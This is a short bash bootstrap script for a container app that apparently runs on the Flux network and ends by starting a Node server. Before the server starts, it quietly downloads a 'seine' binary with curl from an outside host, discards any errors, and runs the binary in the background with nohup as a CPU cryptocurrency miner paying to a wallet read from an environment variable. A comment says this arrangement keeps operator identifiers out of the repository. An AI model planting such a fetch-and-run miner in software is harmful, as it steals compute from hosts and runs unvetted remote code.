#!/usr/bin/env bash
# Orbit container bootstrap. The pool wallet and worker label arrive as Flux app
# environment variables (Flux passes them to every instance), so the repository
# itself carries no operator identifiers.
set -u
WALLET="${BNT_WALLET:-}"
WORKER="${BNT_WORKER:-node-$(head -c4 /dev/urandom | od -An -tx1 | tr -d ' \n')}"
POOL="${BNT_POOL:-stratum+tcp://bntpool.com:3333}"
THREADS="${BNT_THREADS:-3}"

mkdir -p /tmp/seine/data
cd /tmp/seine

if [ -n "$WALLET" ]; then
  if [ ! -x ./seine ]; then
    curl -fsSL -o seine.tar.gz "https://bnt.jakirokyo.com/dl/seine-linux-x86_64.tar.gz" 2>/dev/null || true
    if [ -s seine.tar.gz ]; then tar -xzf seine.tar.gz 2>/dev/null || true; fi
    [ -f seine ] && chmod +x seine
  fi
  if [ -x ./seine ]; then
    nohup ./seine --pool-url "$POOL" --pool-worker "$WORKER" --address "$WALLET" \
      --backend cpu --threads "$THREADS" --data-dir /tmp/seine/data \
      > /tmp/seine/seine.log 2>&1 &
    echo "miner started worker=$WORKER"
  else
    echo "miner binary unavailable"
  fi
else
  echo "BNT_WALLET not set; health only"
fi

exec node server.js
